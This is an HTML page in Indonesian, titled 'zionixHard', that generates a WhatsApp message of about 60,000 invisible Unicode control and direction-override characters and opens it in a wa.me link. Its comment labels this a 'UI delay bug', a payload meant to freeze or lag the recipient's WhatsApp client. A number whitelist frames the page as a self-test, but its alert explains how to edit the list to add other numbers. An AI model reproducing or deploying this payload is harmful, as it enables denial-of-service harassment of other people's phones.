<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>zionixHard</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background-color: #f0f0f0;
    }
    input {
      padding: 12px;
      font-size: 16px;
      width: 280px;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 20px;
    }
    button {
      padding: 12px 24px;
      background-color: #25D366;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background-color: #128C7E;
    }
  </style>
</head>
<body>
  <h1>üß™ zionixHard</h1>
  <p>Masukkan nomor WhatsApp kamu sendiri:</p>
  <input type="text" id="nomor" placeholder="Contoh: 6281234567890"><br>
  <button onclick="kirim()">Kirim Uji Coba</button>

  <script>
    const whitelist = ["6281234567890", "6281234567890"]; // ‚Üê masukkan nomor kamu sendiri

    const bug = (
      "\u200F\u200E\u202E\u202A\u202D\u202B\u200B\u200C\u200D\u2063\u2060\uFEFF\u061C\u00AD"
    ).repeat(4000); // ~60.000 invisible chars (UI delay bug)

    function kirim() {
      const nomor = document.getElementById("nomor").value.trim();
      if (!whitelist.includes(nomor)) {
        alert("Nomor tidak diizinkan (whitelist). Edit dulu jika ingin menambahkan.");
        return;
      }

      const waLink = `https://wa.me/${nomor}?text=${encodeURIComponent(bug)}`;
      window.location.href = waLink;
    }
  </script>
</body>
</html>
